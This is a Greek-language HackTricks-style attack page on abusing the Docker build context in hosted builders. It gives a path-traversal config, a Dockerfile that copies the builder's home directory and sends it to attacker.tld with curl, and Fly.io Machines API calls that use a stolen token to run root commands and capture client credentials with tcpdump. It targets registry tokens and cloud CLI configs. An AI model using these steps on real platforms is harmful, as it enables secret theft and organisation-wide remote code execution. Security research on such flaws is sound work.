# Κατάχρηση του Docker Build Context σε Hosted Builders (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## Σύντομη περίληψη

Αν μια πλατφόρμα CI/CD ή ένας hosted builder επιτρέπει στους συνεισφέροντες να καθορίζουν τη διαδρομή του Docker build context και τη διαδρομή του Dockerfile, συχνά μπορείτε να ορίσετε το context σε έναν γονικό κατάλογο (π.χ. "..") και να κάνετε αρχεία του host μέρος του build context. Έπειτα, ένα Dockerfile υπό τον έλεγχο του επιτιθέμενου μπορεί να κάνει COPY και να exfiltrate μυστικά που βρέθηκαν στο home του χρήστη του builder (π.χ. ~/.docker/config.json). Κλεμμένα registry tokens μπορεί επίσης να λειτουργήσουν ενάντια στα control-plane APIs του provider, επιτρέποντας org-wide RCE.

## Επιφάνεια επίθεσης

Πολλές υπηρεσίες hosted builder/registry κάνουν περίπου τα εξής όταν χτίζουν user-submitted images:
- Διαβάζουν ένα repo-level config που περιλαμβάνει:
  - διαδρομή του build context (αποστέλλεται στον Docker daemon)
  - διαδρομή Dockerfile σχετική με αυτό το context
- Αντιγράφουν τον υποδειχθέντα κατάλογο build context και το Dockerfile στον Docker daemon
- Κατασκευάζουν το image και το τρέχουν ως hosted service

Εάν η πλατφόρμα δεν κανονικοποιεί και δεν περιορίζει το build context, ένας χρήστης μπορεί να το ορίσει σε μια τοποθεσία έξω από το repository (path traversal), προκαλώντας αρχεία του host που είναι αναγνώσιμα από τον build χρήστη να γίνουν μέρος του build context και να είναι διαθέσιμα για COPY στο Dockerfile.

Συνήθεις πρακτικοί περιορισμοί που παρατηρούνται:
- Το Dockerfile πρέπει να βρίσκεται εντός της επιλεγμένης διαδρομής context και η διαδρομή του πρέπει να είναι γνωστή εκ των προτέρων.
- Ο build χρήστης πρέπει να έχει δικαιώματα ανάγνωσης στα αρχεία που περιλαμβάνονται στο context· ειδικά αρχεία συσκευών μπορούν να προκαλέσουν αποτυχία στην αντιγραφή.

## PoC: Path traversal via Docker build context

Παράδειγμα κακόβουλης server config που δηλώνει ένα Dockerfile εντός του context του γονικού καταλόγου:
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
Σημειώσεις:
- Η χρήση ".." συχνά επιλύεται στον κατάλογο home του χρήστη builder (π.χ. /home/builder), ο οποίος συνήθως περιέχει ευαίσθητα αρχεία.
- Τοποθετήστε το Dockerfile κάτω από το όνομα καταλόγου του repo (π.χ. repo "test" → test/Dockerfile) ώστε να παραμένει εντός του επεκταμένου γονικού πλαισίου.

## PoC: Dockerfile για την εισαγωγή και exfiltrate του host context
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
Στόχοι που συνήθως ανακτώνται από το $HOME:
- ~/.docker/config.json (registry auths/tokens)
- Other cloud/CLI caches and configs (e.g., ~/.fly, ~/.kube, ~/.aws, ~/.config/*)

Συμβουλή: Ακόμη και με ένα .dockerignore στο repository, η ευπαθής επιλογή context από την πλευρά της πλατφόρμας εξακολουθεί να καθορίζει τι αποστέλλεται στον daemon. Εάν η πλατφόρμα αντιγράφει το επιλεγμένο path στον daemon πριν αξιολογήσει το .dockerignore του repo σας, αρχεία του host μπορεί να εκτεθούν.

## Pivot στο cloud με overprivileged tokens (παράδειγμα: Fly.io Machines API)

Κάποιες πλατφόρμες εκδίδουν ένα ενιαίο bearer token που είναι χρήσιμο τόσο για το container registry όσο και για το control-plane API. Εάν exfiltrate ένα registry token, δοκιμάστε το στο provider API.

Παραδείγματα κλήσεων API προς το Fly.io Machines API χρησιμοποιώντας το κλεμμένο token από ~/.docker/config.json:

Απαρίθμηση apps σε ένα org:
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
Εκτέλεσε μια εντολή ως root μέσα σε οποιαδήποτε μηχανή μιας εφαρμογής:
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
Αποτέλεσμα: org-wide remote code execution σε όλες τις φιλοξενούμενες εφαρμογές όπου το token έχει επαρκή προνόμια.

## Κλοπή μυστικών από συμβιβασμένες φιλοξενούμενες υπηρεσίες

Με exec/RCE σε φιλοξενούμενους διακομιστές, μπορείτε να συλλέξετε μυστικά που παρέχονται από τον πελάτη (API keys, tokens) ή να πραγματοποιήσετε prompt-injection attacks. Παράδειγμα: εγκαταστήστε tcpdump και καταγράψτε HTTP traffic on port 8080 για να εξάγετε inbound credentials.
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
Τα captured requests συχνά περιέχουν client credentials σε headers, bodies ή query params.

## Αναφορές

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
